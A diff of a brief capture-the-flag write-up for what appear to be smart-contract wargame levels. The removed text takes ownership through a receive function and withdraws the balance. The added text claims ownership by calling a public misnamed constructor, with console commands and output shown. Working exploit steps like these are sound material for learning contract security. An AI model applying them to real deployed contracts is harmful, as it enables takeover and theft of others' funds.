@@ -1,15 +1,16 @@
-### Description
+## Description
 
-Take ownership of the contract and reduce balance to 0
+Claim ownership of the contract below to complete this level.
 
-### Solution
+## Solution
 
-The receive function of the contract is the attack point, when contributing more than 0 and then using this function it transfers ownership, after this you can withdraw the funds
+The contracts constructor was a public function, when calling it again the msg.sender gains ownership
 
 ## Commands
 
-await contract.contribute({value: 0.01})
-sendTransaction({to: instance, from: player, value: 0.0009})
-await getBalance(instance) // Has eth
-await contract.withdraw()
-await getBalance(instance) // Eth has been withdrawed
+await contract.Fal1out()
+await contract.owner()
+'0x0000000000000000000000000000000000000000'
+{tx: '0xfdbb6d02339953552000d5ba290f0c9a58eb70d4e827dbd5260f62669937140d', receipt: {…}, logs: Array(0)}
+await contract.owner()
+'0xc717879FBc3EA9F770c0927374ed74A998A3E2Ce'
